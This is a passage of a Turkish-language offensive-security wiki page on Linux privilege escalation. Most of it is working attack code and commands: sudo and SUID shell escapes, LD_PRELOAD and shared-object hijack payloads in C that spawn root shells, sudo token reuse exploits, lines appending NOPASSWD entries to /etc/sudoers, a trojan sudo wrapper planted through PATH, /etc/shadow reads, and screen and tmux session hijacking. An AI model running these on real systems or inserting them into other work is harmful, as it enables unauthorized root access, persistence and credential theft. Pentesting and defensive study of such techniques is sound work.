Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli biçimde etkileşime girmesine ve veri paylaşmasına imkân veren gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi düşünülerek tasarlanmış olup, farklı uygulamaların iletişimi için sağlam bir çerçeve sunar.

Sistem, süreçler arası veri alışverişini geliştiren temel IPC'yi destekler; bu, gelişmiş UNIX domain socket'lerine benzer. Ayrıca olay veya sinyal yayınlamayı destekleyerek sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama bildirimi bir müzik çalarını sessize aldırabilir. Ek olarak, D-Bus uzak nesne sistemini destekler; bu da uygulamalar arasında servis taleplerini ve method çağrılarını basitleştirir, geleneksel olarak karmaşık olan süreçleri düzene koyar.

D-Bus, mesaj izinlerini (method çağrıları, sinyal gönderimleri vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny model** üzerinde çalışır. Bu politikalar bus ile hangi etkileşimlere izin verildiğini belirler ve bu izinlerin kötüye kullanılması yoluyla privilege escalation mümkün olabilir.

Böyle bir politikanın `/etc/dbus-1/system.d/wpa_supplicant.conf` içindeki bir örneği verilmiştir; root kullanıcısının `fi.w1.wpa_supplicant1`'i sahiplenme, ona gönderme ve ondan mesaj alma izinlerini detaylandırır.

Belirli bir user veya group belirtilmeyen politikalar evrensel olarak uygulanır; "default" context politikaları ise diğer belirli politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Burada bir D-Bus iletişimini enumerate ve exploit etmeyi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate edip makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişmeden önce, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sniff traffic yapıp yapamayacağınızı kontrol edin. Eğer yapabiliyorsanız bazı credentials ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Generic Enumeration

**Kim** olduğunuzu, hangi **privileges**'a sahip olduğunuzu, sistemde hangi **users** bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'a sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Sizi root ayrıcalıkları verebilecek herhangi bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Panoya

Panoda (mümkünse) ilginç bir şey olup olmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir parolasını **biliyorsanız**, parolayı kullanarak **her kullanıcıyla giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı önemsemiyorsanız ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıları brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcıları brute-force etmeye çalışır.

## Yazılabilir $PATH suistimalleri

### $PATH

Eğer $PATH içindeki herhangi bir klasöre **yazabiliyorsanız**, yazılabilir klasörün içine **backdoor oluşturarak** hak yükseltmesi sağlayabilirsiniz; bu backdoor, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla olmalı ve **$PATH'te sizin yazılabilir klasörünüzden önce bulunan bir klasörden yüklenmemelidir**.

### SUDO and SUID

Bazı komutları sudo ile çalıştırma izniniz olabilir veya bazı ikililerde suid bit'i setli olabilir. Bunu kontrol etmek için:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza ya da hatta bir komut çalıştırmanıza izin verebilir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının şifreyi bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; root dizinine bir ssh key ekleyerek veya `sh` çağırarak shell elde etmek artık çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **set an environment variable** yapmasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer**'a dayanan ve script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **istismara açıktı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep aracılığıyla korundu → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Why it works: Etkileşimsiz shell'lerde, Bash `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script'i veya bir shell wrapper'ını çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Requirements:
- Çalıştırabileceğiniz bir sudo kuralı (non-interactive olarak `/bin/bash`'ı çağıran herhangi bir hedef, veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (kontrol etmek için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Güçlendirme:
- `env_keep` içinden `BASH_ENV` (ve `ENV`) öğesini kaldırın, `env_reset`'i tercih edin.
- sudo-allowed commands için shell wrappers kullanmaktan kaçının; minimal binaries kullanın.
- preserved env vars kullanıldığında sudo I/O logging ve alerting'i değerlendirin.

### Sudo yürütme atlatma yolları

**Jump** yaparak diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılıyorsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmeden

Eğer **sudo permission** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, eğer bir **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman tuhaf bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin)**.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, çağırdığı komutun adıyla bir **export a function** oluşturmaya çalışabilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'yi çağırdığınızda, bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable, loader tarafından standart C kütüphanesi (`libc.so`) dahil diğer tüm kütüphanelerden önce yüklenmesi için bir veya daha fazla shared library (.so files) belirtmekte kullanılır. Bu işleme kütüphane preload etme denir.

Ancak, bu özelliğin özellikle **suid/sgid** yürütülebilirlerle kötüye kullanılmasını önlemek ve sistem güvenliğini korumak için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) etkin kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilirler için **LD_PRELOAD**'u göz ardı eder.
- suid/sgid olan yürütülebilirler için yalnızca standart dizinlerde bulunan ve ayrıca suid/sgid olan kütüphaneler önceden yüklenir.

Eğer `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa ayrıcalık yükseltmesi meydana gelebilir. Bu yapılandırma, `sudo` ile komutlar çalıştırılırken bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kod yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **bunu derleyin** şu komutu kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, çalıştırarak **ayrıcalıkları yükseltin**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ederse kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak istismar için potansiyel olduğunu gösterir.

Bunu istismar etmek için, aşağıdaki kodu içeren bir C dosyası oluşturulur; örneğin _"/path/to/.config/libcalc.c"_:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetikleyecek ve potansiyel olarak sistemin ele geçirilmesine yol açacaktır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabileceğimiz bir folder'dan library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle library'yi o folder'a oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının, bir saldırgan tarafından yerel güvenlik kısıtlamalarını aşmak için sömürülebileceği öğelerin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şeydir ancak bir komuta **sadece argüman enjekte edebildiğiniz** durumlar içindir.

Proje, restricted shells'den çıkmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bind ve reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` erişiminiz varsa, herhangi bir sudo kuralını nasıl sömürebileceğini kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolasını bilmediğiniz durumlarda, **sudo access**'iniz varsa, ayrıcalıkları bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek yükseltebilirsiniz.

Requirements to escalate privileges:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" son **15 dakika** içinde `sudo` kullanarak bir şey çalıştırdı (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalıdır
- `gdb` erişilebilir olmalı (yükleyebilirsiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) _/tmp_ dizinine `activate_sudo_token` ikilisini oluşturacaktır. Bunu oturumunuzda **sudo token'ını aktifleştirmek** için kullanabilirsiniz (otomatik olarak root shell elde etmeyeceksiniz, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **ikinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root sahipliğinde ve setuid ile** bir sh shell oluşturacak.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Üçüncü **exploit** (`exploit_v3.sh`) **sudoers file oluşturacak** ve bu dosya **sudo token'larını sonsuz hale getirip tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak **create a sudo token for a user and PID** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını overwrite edebiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan **obtain sudo privileges** elde edebilirsiniz şu şekilde:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve bunun nasıl yapılacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgilere **ulaşabilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` binary'sine bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'da kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp yetki yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu çalıştıracak ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo executable** oluşturabilirsiniz. Ardından, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu `.bash_profile`'a ekleyerek) değiştirin ki kullanıcı `sudo` çalıştırdığında sizin sudo yürütülebilir dosyanız çalışsın.

Not: Kullanıcı farklı bir shell (bash olmayan) kullanıyorsa yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, yüklenen yapılandırma dosyalarının **nereden geldiğini** gösterir. Tipik olarak bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** aranacağı diğer klasörlere işaret eder. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir.**

Eğer bir kullanıcı belirtilen yollardan herhangi birinde **yazma iznine sahipse**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, yetki yükseltmesi yapabiliyor olabilir.\
Bu yanlış yapılandırmanın **nasıl exploit edileceğine** aşağıdaki sayfaya bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalayarak, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde şu komutla kötü amaçlı bir kütüphane oluşturun `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri bir sürece mevcut root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root ayrıcalıklarını **daha küçük ve ayırt edici birimlere** ayırır. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu sayede ayrıcalıkların tamamı azaltılır ve istismar riskleri düşürülür.\
Aşağıdaki sayfayı okuyarak **yetkiler hakkında ve bunların nasıl kötüye kullanılacağı hakkında daha fazla bilgi edinin**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"çalıştırma" biti** etkilenen kullanıcının "**cd**" ile klasöre girebileceğini gösterir.\
**"okuma"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"yazma"** biti kullanıcının **yeni dosyaları silme** ve **oluşturma** yetkisine sahip olduğunu gösterir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilir**. Bu izinler, sahip olmayan veya grup üyesi olmayan belirli kullanıcılara hak verip reddederek dosya veya dizin erişimi üzerinde kontrolü artırır. Bu düzeydeki **ince ayrıntı daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakabilirsiniz.

**Verin** kullanıcı "kali"ye bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemden belirli ACLs'ye sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell sessions

Eski sürümlerde farklı bir kullanıcının (**root**) bazı **shell** sessionlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** yalnızca **kendi kullanıcınızın** screen session'larına **connect** olabilirsiniz. Ancak **session içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**Screen sessions'i listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Bir ayrıcalıksız kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'a bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, bu OS'lerde yeni bir ssh anahtarı oluşturulurken ortaya çıkar, çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olarak karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şuradan bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: Root sadece private key ile ve command seçenekleri belirtilmişse giriş yapabilir
- `no` : hayır

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi home dizini ile değiştirilecek token'lar içerebilir. **Absolute path'leri belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının home'undan göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer kullanıcı "**testusername**"ın **özel** anahtarıyla giriş yapmaya çalışırsanız, ssh'in anahtarınızın açık anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindeki anahtarlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (parola koruması olmadan!) anahtarlar bırakmak yerine **yerel SSH anahtarlarınızı kullanmanıza** izin verir. Böylece ssh ile **bir host'a atlayabilir** ve oradan **başka bir host'a** **başlangıç hostunuzda** bulunan **anahtarı kullanarak** erişebilirsiniz.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Dikkat edin: eğer `Host` `*` ise kullanıcı farklı bir makineye her bağlandığında o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
